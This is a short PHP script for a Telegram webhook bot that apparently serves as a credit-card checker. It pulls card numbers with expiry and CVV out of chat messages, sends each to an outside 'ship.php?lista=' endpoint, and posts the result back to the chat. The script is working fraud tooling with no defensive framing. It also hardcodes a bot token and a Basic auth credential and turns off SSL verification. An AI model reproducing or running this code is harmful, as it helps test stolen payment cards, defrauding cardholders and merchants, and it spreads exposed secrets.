<?php

$bottoken = "8310617057:AAH22wb_CR4JI_pGWh7bkjiL1hP6UrcgSaM";
$website = "https://api.telegram.org/bot" . $bottoken;

// Get update from Telegram webhook
$update = file_get_contents('php://input');
$updateArray = json_decode($update, TRUE);

// Get basic data (Webhook sends single message directly)
$chatid = $updateArray["message"]["chat"]["id"] ?? null;
$text = $updateArray["message"]["text"] ?? "";

if (!$chatid || !$text) {
    exit;
}

// === Pattern Matching === //
preg_match_all('/\b\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}\b/', $text, $matches);
$valids = $matches[0] ?? [];

if (empty($valids)) {
    // Fallback response
    file_get_contents($website . "/sendMessage?chat_id=$chatid&text=" . urlencode("❌ No valid card format found."));
    exit;
}

foreach ($valids as $match) {
    $url = "http://shivatejax07-001-site1.mtempurl.com/ship.php/?lista=" . urlencode($match);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Authorization: Basic MTEyNTI0NTE6NjAtZGF5ZnJlZXRyaWFs"
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    curl_close($ch);

    file_get_contents($website . "/sendMessage?chat_id=$chatid&text=" . urlencode("$response"));
}
